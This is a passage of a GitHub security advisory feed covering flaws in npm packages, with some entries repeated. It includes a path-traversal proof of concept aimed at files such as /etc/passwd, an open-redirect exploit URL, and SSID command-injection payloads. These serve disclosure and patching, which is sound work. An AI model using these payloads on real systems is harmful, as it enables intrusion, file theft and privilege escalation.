            <uri>https://github.com/advisories/GHSA-53rv-hcvm-rpp9</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-01-14T22:03:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[dom-iterator] dom-iterator code execution vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-jrvm-mcxc-mf6m</id>
        <link href="https://github.com/advisories/GHSA-jrvm-mcxc-mf6m"/>
        <updated>2025-01-14T21:18:04.000Z</updated>
        <content type="html"><![CDATA[<p>Versions of the package dom-iterator before 1.0.1 are vulnerable to Arbitrary Code Execution due to use of the Function constructor without complete input sanitization. Function generates a new function body and thus care must be given to ensure that the inputs to Function are not attacker-controlled. The risks involved are similar to that of allowing attacker-controlled input to reach eval.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21541">https://nvd.nist.gov/vuln/detail/CVE-2024-21541</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JS-DOMITERATOR-6157199">https://security.snyk.io/vuln/SNYK-JS-DOMITERATOR-6157199</a></li>
<li><a href="https://github.com/matthewmueller/dom-iterator/commit/9e0e0fad5a251de5b42feb326c4204eb04080805">https://github.com/matthewmueller/dom-iterator/commit/9e0e0fad5a251de5b42feb326c4204eb04080805</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-8383166">https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-8383166</a></li>
<li><a href="https://github.com/advisories/GHSA-jrvm-mcxc-mf6m">https://github.com/advisories/GHSA-jrvm-mcxc-mf6m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jrvm-mcxc-mf6m</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-11-13T06:30:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[next] Next.js Allows a Denial of Service (DoS) with Server Actions]]></title>
        <id>https://github.com/advisories/GHSA-7m27-7ghc-44w9</id>
        <link href="https://github.com/advisories/GHSA-7m27-7ghc-44w9"/>
        <updated>2025-01-07T16:24:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A Denial of Service (DoS) attack allows attackers to construct requests that leaves requests to Server Actions hanging until the hosting provider cancels the function execution.</p>
<p><em>Note: Next.js server is idle during that time and only keeps the connection open. CPU and memory footprint are low during that time.</em></p>
<p>Deployments without any protection against long running Server Action invocations are especially vulnerable. Hosting providers like Vercel or Netlify set a default maximum duration on function execution to reduce the risk of excessive billing.</p>
<p>This is the same issue as if the incoming HTTP request has an invalid <code>Content-Length</code> header or never closes. If the host has no other mitigations to those then this vulnerability is novel.</p>
<p>This vulnerability affects only Next.js deployments using Server Actions.</p>
<h3 id="patches">Patches</h3>
<p>This vulnerability was resolved in Next.js 14.2.21, 15.1.2, and 13.5.8. We recommend that users upgrade to a safe version.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There are no official workarounds for this vulnerability.</p>
<h3 id="credits">Credits</h3>
<p>Thanks to the PackDraw team for responsibly disclosing this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vercel/next.js/security/advisories/GHSA-7m27-7ghc-44w9">https://github.com/vercel/next.js/security/advisories/GHSA-7m27-7ghc-44w9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56332">https://nvd.nist.gov/vuln/detail/CVE-2024-56332</a></li>
<li><a href="https://github.com/advisories/GHSA-7m27-7ghc-44w9">https://github.com/advisories/GHSA-7m27-7ghc-44w9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7m27-7ghc-44w9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-03T20:19:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[next] Next.js Allows a Denial of Service (DoS) with Server Actions]]></title>
        <id>https://github.com/advisories/GHSA-7m27-7ghc-44w9</id>
        <link href="https://github.com/advisories/GHSA-7m27-7ghc-44w9"/>
        <updated>2025-01-07T16:24:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A Denial of Service (DoS) attack allows attackers to construct requests that leaves requests to Server Actions hanging until the hosting provider cancels the function execution.</p>
<p><em>Note: Next.js server is idle during that time and only keeps the connection open. CPU and memory footprint are low during that time.</em></p>
<p>Deployments without any protection against long running Server Action invocations are especially vulnerable. Hosting providers like Vercel or Netlify set a default maximum duration on function execution to reduce the risk of excessive billing.</p>
<p>This is the same issue as if the incoming HTTP request has an invalid <code>Content-Length</code> header or never closes. If the host has no other mitigations to those then this vulnerability is novel.</p>
<p>This vulnerability affects only Next.js deployments using Server Actions.</p>
<h3 id="patches">Patches</h3>
<p>This vulnerability was resolved in Next.js 14.2.21, 15.1.2, and 13.5.8. We recommend that users upgrade to a safe version.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There are no official workarounds for this vulnerability.</p>
<h3 id="credits">Credits</h3>
<p>Thanks to the PackDraw team for responsibly disclosing this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vercel/next.js/security/advisories/GHSA-7m27-7ghc-44w9">https://github.com/vercel/next.js/security/advisories/GHSA-7m27-7ghc-44w9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56332">https://nvd.nist.gov/vuln/detail/CVE-2024-56332</a></li>
<li><a href="https://github.com/advisories/GHSA-7m27-7ghc-44w9">https://github.com/advisories/GHSA-7m27-7ghc-44w9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7m27-7ghc-44w9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-03T20:19:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[next] Next.js Allows a Denial of Service (DoS) with Server Actions]]></title>
        <id>https://github.com/advisories/GHSA-7m27-7ghc-44w9</id>
        <link href="https://github.com/advisories/GHSA-7m27-7ghc-44w9"/>
        <updated>2025-01-07T16:24:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A Denial of Service (DoS) attack allows attackers to construct requests that leaves requests to Server Actions hanging until the hosting provider cancels the function execution.</p>
<p><em>Note: Next.js server is idle during that time and only keeps the connection open. CPU and memory footprint are low during that time.</em></p>
<p>Deployments without any protection against long running Server Action invocations are especially vulnerable. Hosting providers like Vercel or Netlify set a default maximum duration on function execution to reduce the risk of excessive billing.</p>
<p>This is the same issue as if the incoming HTTP request has an invalid <code>Content-Length</code> header or never closes. If the host has no other mitigations to those then this vulnerability is novel.</p>
<p>This vulnerability affects only Next.js deployments using Server Actions.</p>
<h3 id="patches">Patches</h3>
<p>This vulnerability was resolved in Next.js 14.2.21, 15.1.2, and 13.5.8. We recommend that users upgrade to a safe version.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There are no official workarounds for this vulnerability.</p>
<h3 id="credits">Credits</h3>
<p>Thanks to the PackDraw team for responsibly disclosing this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vercel/next.js/security/advisories/GHSA-7m27-7ghc-44w9">https://github.com/vercel/next.js/security/advisories/GHSA-7m27-7ghc-44w9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56332">https://nvd.nist.gov/vuln/detail/CVE-2024-56332</a></li>
<li><a href="https://github.com/advisories/GHSA-7m27-7ghc-44w9">https://github.com/advisories/GHSA-7m27-7ghc-44w9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7m27-7ghc-44w9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-03T20:19:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[trix] Trix allows Cross-site Scripting via `javascript:` url in a link]]></title>
        <id>https://github.com/advisories/GHSA-j386-3444-qgwg</id>
        <link href="https://github.com/advisories/GHSA-j386-3444-qgwg"/>
        <updated>2025-01-03T19:26:15.000Z</updated>
        <content type="html"><![CDATA[<p>The Trix editor, versions prior to 2.1.11, is vulnerable to XSS when pasting malicious code in the link field.</p>
<h3 id="impact">Impact</h3>
<p>An attacker could trick the user to copy&amp;paste a malicious <code>javascript:</code> URL as a link that would execute arbitrary JavaScript code within the context of the user's session, potentially leading to unauthorized actions being performed or sensitive information being disclosed.</p>
<p>See <a href="https://gist.github.com/th4s1s/3921fd9c3e324ad9a3e0d846166e3eb8">https://gist.github.com/th4s1s/3921fd9c3e324ad9a3e0d846166e3eb8</a></p>
<h3 id="patches">Patches</h3>
<p>Update Recommendation: Users should upgrade to Trix editor version 2.1.12 or later.</p>
<h3 id="workarounds">Workarounds</h3>
<p>This is not really a workaround but something that should be considered in addition to upgrading to the patched version. If affected users can disallow browsers that don't support a Content Security Policy, then this would be an effective workaround for this and all XSS vulnerabilities. Set CSP policies such as script-src 'self' to ensure that only scripts hosted on the same origin are executed, and explicitly prohibit inline scripts using script-src-elem.</p>
<h3 id="references">References</h3>
<p><a href="https://gist.github.com/th4s1s/3921fd9c3e324ad9a3e0d846166e3eb8">https://gist.github.com/th4s1s/3921fd9c3e324ad9a3e0d846166e3eb8</a></p>
<h3 id="credits">Credits</h3>
<p>This vulnerability was reported by Hackerone researcher <a href="https://hackerone.com/lio346?type=user">https://hackerone.com/lio346?type=user</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/basecamp/trix/security/advisories/GHSA-j386-3444-qgwg">https://github.com/basecamp/trix/security/advisories/GHSA-j386-3444-qgwg</a></li>
<li><a href="https://github.com/basecamp/trix/commit/180c8d337f18e1569cea6ef29b4d03ffff5b5faa">https://github.com/basecamp/trix/commit/180c8d337f18e1569cea6ef29b4d03ffff5b5faa</a></li>
<li><a href="https://github.com/basecamp/trix/commit/c4f0d6f80654603932af6685694f694e96593b93">https://github.com/basecamp/trix/commit/c4f0d6f80654603932af6685694f694e96593b93</a></li>
<li><a href="https://gist.github.com/th4s1s/3921fd9c3e324ad9a3e0d846166e3eb8">https://gist.github.com/th4s1s/3921fd9c3e324ad9a3e0d846166e3eb8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-21610">https://nvd.nist.gov/vuln/detail/CVE-2025-21610</a></li>
<li><a href="https://github.com/advisories/GHSA-j386-3444-qgwg">https://github.com/advisories/GHSA-j386-3444-qgwg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j386-3444-qgwg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-03T16:29:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[path-sanitizer] path-sanitizer allows bypassing the existing filters to achieve path-traversal vulnerability ]]></title>
        <id>https://github.com/advisories/GHSA-94p5-r7cc-3rpr</id>
        <link href="https://github.com/advisories/GHSA-94p5-r7cc-3rpr"/>
        <updated>2025-01-02T12:52:43.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>This is a POC for a path-sanitizer <a href="https://www.npmjs.com/package/path-sanitizer">npm package</a>. The filters can be bypassed and can result in path traversal.</p>
<p>Payload: <code>..=%5c</code> can be used to bypass this on CLI (along with other candidates). Something similar would likely work on web apps as well. </p>
<h3 id="poc">PoC</h3>
<p>Here's the code to test for the filter bypass:</p>
<pre><code class="language-js">const sanitize = require("path-sanitizer")
const path = require("path")
const fs = require("fs")

// Real scenario:
function routeHandler(myPath) {
  // Lets just assume that the path was extracted from the request
  // We want to read a file in the C:\Users\user\Desktop\myApp\ directory
  // But the user should be able to access C:\Users\user\Desktop\
  // So we need to sanitize the path

  const APP_DIR = "/var/hacker"
  const sanitized = path.join(APP_DIR, sanitize(myPath))

  // Now we would usally read the file
  // But in this case we just gonna print the path
  // console.log(sanitized)
  return sanitized
}

function readFile(filePath) {
  const absolutePath = path.resolve(filePath) // Resolve to absolute path

  fs.readFile(absolutePath, "utf8", (err, data) =&gt; {
    if (err) {
      console.error(`Error reading the file: ${err.message}`)
      return
    }
    console.log(`Contents of the file ${filePath} :\n${data}`)
  })
}

input_user_bypass = "..=%5c..=%5c..=%5c..=%5c..=%5c..=%5c..=%5ctmp/hacked.txt"
// input_user_bypass = "..=%5c..=%5c..=%5c..=%5c..=%5c..=%5c..=%5cetc/passwd"
input_user_payload = "../../../../../../../../tmp/hacked.txt"

readFile(routeHandler(input_user_bypass))
readFile(routeHandler(input_user_payload))
</code></pre>
<p>Here is a video POC: (this is a Loom POC, only users with the UUID of the video can see it) </p>
<p><a href="https://www.loom.com/share/b766ece5193842848ce7562fcd559256?sid=fd826eb6-0eee-4601-bf0e-9cfee5c56e9d">https://www.loom.com/share/b766ece5193842848ce7562fcd559256?sid=fd826eb6-0eee-4601-bf0e-9cfee5c56e9d</a></p>
<h3 id="impact">Impact</h3>
<p>Any CLI tool or library using this package can be/will be vulnerable to Path traversal.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cabraviva/path-sanitizer/security/advisories/GHSA-94p5-r7cc-3rpr">https://github.com/cabraviva/path-sanitizer/security/advisories/GHSA-94p5-r7cc-3rpr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56198">https://nvd.nist.gov/vuln/detail/CVE-2024-56198</a></li>
<li><a href="https://github.com/cabraviva/path-sanitizer/commit/b6d2319eac910dffdfacc8460f5b5cc5a1518ead">https://github.com/cabraviva/path-sanitizer/commit/b6d2319eac910dffdfacc8460f5b5cc5a1518ead</a></li>
<li><a href="https://www.loom.com/share/b766ece5193842848ce7562fcd559256?sid=fd826eb6-0eee-4601-bf0e-9cfee5c56e9d">https://www.loom.com/share/b766ece5193842848ce7562fcd559256?sid=fd826eb6-0eee-4601-bf0e-9cfee5c56e9d</a></li>
<li><a href="https://github.com/advisories/GHSA-94p5-r7cc-3rpr">https://github.com/advisories/GHSA-94p5-r7cc-3rpr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-94p5-r7cc-3rpr</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-01-02T12:52:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[better-auth] Better Auth has an Open Redirect Vulnerability in Verify Email Endpoint]]></title>
        <id>https://github.com/advisories/GHSA-8jhw-6pjj-8723</id>
        <link href="https://github.com/advisories/GHSA-8jhw-6pjj-8723"/>
        <updated>2024-12-30T18:45:18.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>An <strong>open redirect vulnerability</strong> has been identified in the <strong>verify email endpoint</strong> of Better Auth, potentially allowing attackers to redirect users to malicious websites. This issue affects users relying on email verification links generated by the library.</p>
<h2 id="affected-versions">Affected Versions</h2>
<ul>
<li>All versions prior to <strong>v1.1.6</strong>.</li>
</ul>
<h2 id="impact">Impact</h2>
<p>Attackers could craft malicious email verification links that exploit the redirect functionality to send users to untrusted domains. This can result in:</p>
<ul>
<li><strong>Phishing attacks</strong> – Users may unknowingly enter sensitive information on fake login pages.</li>
<li><strong>Reputation damage</strong> – Trust issues for applications using Better Auth.</li>
</ul>
<h2 id="vulnerability-details">Vulnerability Details</h2>
<p>The verify email callback endpoint accepts a <code>callbackURL</code> parameter. Unlike other verification methods, email verification only uses JWT to verify and redirect without proper validation of the target domain. The origin checker is bypassed in this scenario because it only checks for <code>POST</code> requests. An attacker can manipulate this parameter to redirect users to arbitrary URLs controlled by the attacker.</p>
<p><strong>Example Exploit:</strong></p>
<pre><code>https://example.com/auth/verify-email?token=abcd1234&amp;callbackURL=https://malicious-site.com
</code></pre>
<h2 id="patches">Patches</h2>
<p>Upgrade to Better Auth <strong>v1.1.6</strong> or later. This version enforces domain validation for <code>callbackURL</code> for <code>/verify-email</code> path and for all other <code>GET</code> endpoints.</p>
<h2 id="workarounds">Workarounds</h2>
<p>You can also use hooks to pre-check URLs in your auth instance to prevent this without upgrading:</p>
<pre><code class="language-ts">const auth = betterAuth({
    hooks: {
         before: (ctx) =&gt; {
            if (ctx.path === "/verify-email") {
               const callbackURL = ctx.query.callbackURL; // Check if this is a trusted callback URL or not
            }
         }
    }
})
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/better-auth/better-auth/security/advisories/GHSA-8jhw-6pjj-8723">https://github.com/better-auth/better-auth/security/advisories/GHSA-8jhw-6pjj-8723</a></li>
<li><a href="https://github.com/better-auth/better-auth/commit/deb3d73aea90d0468d92723f4511542b593e522f">https://github.com/better-auth/better-auth/commit/deb3d73aea90d0468d92723f4511542b593e522f</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56734">https://nvd.nist.gov/vuln/detail/CVE-2024-56734</a></li>
<li><a href="https://github.com/advisories/GHSA-8jhw-6pjj-8723">https://github.com/advisories/GHSA-8jhw-6pjj-8723</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8jhw-6pjj-8723</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-12-30T16:49:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@marp-team/marp-core] Marp Core allows XSS by improper neutralization of HTML sanitization]]></title>
        <id>https://github.com/advisories/GHSA-x52f-h5g4-8qv5</id>
        <link href="https://github.com/advisories/GHSA-x52f-h5g4-8qv5"/>
        <updated>2024-12-26T21:46:03.000Z</updated>
        <content type="html"><![CDATA[<p>Marp Core (<a href="https://www.npmjs.com/package/@marp-team/marp-core"><code>@marp-team/marp-core</code></a>) from v3.0.2 to v3.9.0 and v4.0.0, are vulnerable to cross-site scripting (XSS)  due to improper neutralization of HTML sanitization.</p>
<h3 id="impact">Impact</h3>
<p>Marp Core includes an HTML sanitizer with allowlist support. In the affected versions, the built-in allowlist is enabled by default. When the allowlist is active, if insufficient HTML comments are included, the sanitizer may fail to properly sanitize HTML content and lead cross-site scripting (XSS).</p>
<h3 id="patches">Patches</h3>
<p>Marp Core <a href="https://github.com/marp-team/marp-core/releases/tag/v3.9.1">v3.9.1</a> and <a href="https://github.com/marp-team/marp-core/releases/tag/v4.0.1">v4.0.1</a> have been patched to fix that.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If you are unable to update the package immediately, disable all HTML tags by setting <code>html: false</code> option in the <code>Marp</code> class constructor.</p>
<pre><code class="language-javascript">const marp = new Marp({ html: false })
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>
<li><a href="https://github.com/marp-team/marp-core/pull/282">https://github.com/marp-team/marp-core/pull/282</a></li>
<li><a href="https://github.com/marp-team/marp-core/commit/61a1def244d1b6faa8e2c0be97ec0b68cab3ab49">https://github.com/marp-team/marp-core/commit/61a1def244d1b6faa8e2c0be97ec0b68cab3ab49</a></li>
</ul>
<h3 id="credits">Credits</h3>
<p>Thanks to @Ry0taK for finding out this vulnerability.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/marp-team/marp-core/security/advisories/GHSA-x52f-h5g4-8qv5">https://github.com/marp-team/marp-core/security/advisories/GHSA-x52f-h5g4-8qv5</a></li>
<li><a href="https://github.com/marp-team/marp-core/pull/282">https://github.com/marp-team/marp-core/pull/282</a></li>
<li><a href="https://github.com/marp-team/marp-core/commit/61a1def244d1b6faa8e2c0be97ec0b68cab3ab49">https://github.com/marp-team/marp-core/commit/61a1def244d1b6faa8e2c0be97ec0b68cab3ab49</a></li>
<li><a href="https://github.com/marp-team/marp-core/releases/tag/v3.9.1">https://github.com/marp-team/marp-core/releases/tag/v3.9.1</a></li>
<li><a href="https://github.com/marp-team/marp-core/releases/tag/v4.0.1">https://github.com/marp-team/marp-core/releases/tag/v4.0.1</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56510">https://nvd.nist.gov/vuln/detail/CVE-2024-56510</a></li>
<li><a href="https://github.com/advisories/GHSA-x52f-h5g4-8qv5">https://github.com/advisories/GHSA-x52f-h5g4-8qv5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x52f-h5g4-8qv5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-26T18:25:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@marp-team/marp-core] Marp Core allows XSS by improper neutralization of HTML sanitization]]></title>
        <id>https://github.com/advisories/GHSA-x52f-h5g4-8qv5</id>
        <link href="https://github.com/advisories/GHSA-x52f-h5g4-8qv5"/>
        <updated>2024-12-26T21:46:03.000Z</updated>
        <content type="html"><![CDATA[<p>Marp Core (<a href="https://www.npmjs.com/package/@marp-team/marp-core"><code>@marp-team/marp-core</code></a>) from v3.0.2 to v3.9.0 and v4.0.0, are vulnerable to cross-site scripting (XSS)  due to improper neutralization of HTML sanitization.</p>
<h3 id="impact">Impact</h3>
<p>Marp Core includes an HTML sanitizer with allowlist support. In the affected versions, the built-in allowlist is enabled by default. When the allowlist is active, if insufficient HTML comments are included, the sanitizer may fail to properly sanitize HTML content and lead cross-site scripting (XSS).</p>
<h3 id="patches">Patches</h3>
<p>Marp Core <a href="https://github.com/marp-team/marp-core/releases/tag/v3.9.1">v3.9.1</a> and <a href="https://github.com/marp-team/marp-core/releases/tag/v4.0.1">v4.0.1</a> have been patched to fix that.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If you are unable to update the package immediately, disable all HTML tags by setting <code>html: false</code> option in the <code>Marp</code> class constructor.</p>
<pre><code class="language-javascript">const marp = new Marp({ html: false })
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>
<li><a href="https://github.com/marp-team/marp-core/pull/282">https://github.com/marp-team/marp-core/pull/282</a></li>
<li><a href="https://github.com/marp-team/marp-core/commit/61a1def244d1b6faa8e2c0be97ec0b68cab3ab49">https://github.com/marp-team/marp-core/commit/61a1def244d1b6faa8e2c0be97ec0b68cab3ab49</a></li>
</ul>
<h3 id="credits">Credits</h3>
<p>Thanks to @Ry0taK for finding out this vulnerability.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/marp-team/marp-core/security/advisories/GHSA-x52f-h5g4-8qv5">https://github.com/marp-team/marp-core/security/advisories/GHSA-x52f-h5g4-8qv5</a></li>
<li><a href="https://github.com/marp-team/marp-core/pull/282">https://github.com/marp-team/marp-core/pull/282</a></li>
<li><a href="https://github.com/marp-team/marp-core/commit/61a1def244d1b6faa8e2c0be97ec0b68cab3ab49">https://github.com/marp-team/marp-core/commit/61a1def244d1b6faa8e2c0be97ec0b68cab3ab49</a></li>
<li><a href="https://github.com/marp-team/marp-core/releases/tag/v3.9.1">https://github.com/marp-team/marp-core/releases/tag/v3.9.1</a></li>
<li><a href="https://github.com/marp-team/marp-core/releases/tag/v4.0.1">https://github.com/marp-team/marp-core/releases/tag/v4.0.1</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56510">https://nvd.nist.gov/vuln/detail/CVE-2024-56510</a></li>
<li><a href="https://github.com/advisories/GHSA-x52f-h5g4-8qv5">https://github.com/advisories/GHSA-x52f-h5g4-8qv5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x52f-h5g4-8qv5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-26T18:25:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[systeminformation] Systeminformation has command injection vulnerability in getWindowsIEEE8021x (SSID)]]></title>
        <id>https://github.com/advisories/GHSA-cvv5-9h9w-qp2m</id>
        <link href="https://github.com/advisories/GHSA-cvv5-9h9w-qp2m"/>
        <updated>2024-12-20T21:37:02.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The SSID is not sanitized when before it is passed as a parameter to cmd.exe in the <code>getWindowsIEEE8021x</code> function. This means that malicious content in the SSID can be executed as OS commands. </p>
<h3 id="details">Details</h3>
<p>I have exploited this vulnerability in a Windows service using version 5.22.11 of the module, to escalate privileges (in an environment where I am authorized to do so). However, as far as I can see from the code, it is still present in master branch at time of writing, on line <a href="https://github.com/sebhildebrandt/systeminformation/blob/3a92931c7d46605ffddc1aacb97a9727273b2888/lib/network.js#L403">403/404 of network.js</a>.</p>
<p>The SSID is obtained from <code>netsh wlan show interface ...</code> in <code>getWindowsWirelessIfaceSSID</code>, and then passed to <code>cmd.exe /d /s /c "netsh wlan show profiles ...</code> in <code>getWindowsIEEE8021x</code>, without sanitization.</p>
<h3 id="poc">PoC</h3>
<p>First, the command injection payload should be included in the connected Wi-Fi SSID. For example create hotspot on mobile phone or other laptop, set SSID to payload, connect to it with victim Windows system. Two example SSID's to demonstrate exploitation are below.</p>
<p>Demonstration to run ping command indefinitely:</p>
<pre><code>a" | ping /t 127.0.0.1 &amp;
</code></pre>
<p>Run executable with privileges of the user in which vulnerable function is executed. Chosen executable should should be placed in (assuming system drive is C): <code>C:\a\a.exe</code>.</p>
<pre><code>a" | %SystemDrive%\a\a.exe &amp;
</code></pre>
<p>Then, the vulnerable function can be executed on the victim system, for example, using:</p>
<pre><code>const si = require('systeminformation');
si.networkInterfaces((net) =&gt; { console.log(net) });
</code></pre>
<p>Now the chosen command, <code>PING.exe</code> or <code>a.exe</code> will be run through the cmd.exe command line.</p>
<h3 id="impact">Impact</h3>
<p>This vulnerability may enable an attacker, depending on how the package is used, to perform remote code execution or local privilege escalation.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sebhildebrandt/systeminformation/security/advisories/GHSA-cvv5-9h9w-qp2m">https://github.com/sebhildebrandt/systeminformation/security/advisories/GHSA-cvv5-9h9w-qp2m</a></li>
<li><a href="https://github.com/sebhildebrandt/systeminformation/commit/f7af0a67b78e7894335a6cad510566a25e06ae41">https://github.com/sebhildebrandt/systeminformation/commit/f7af0a67b78e7894335a6cad510566a25e06ae41</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56334">https://nvd.nist.gov/vuln/detail/CVE-2024-56334</a></li>
<li><a href="https://github.com/advisories/GHSA-cvv5-9h9w-qp2m">https://github.com/advisories/GHSA-cvv5-9h9w-qp2m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cvv5-9h9w-qp2m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-12-20T19:13:23.000Z</published>
    </entry>
</feed>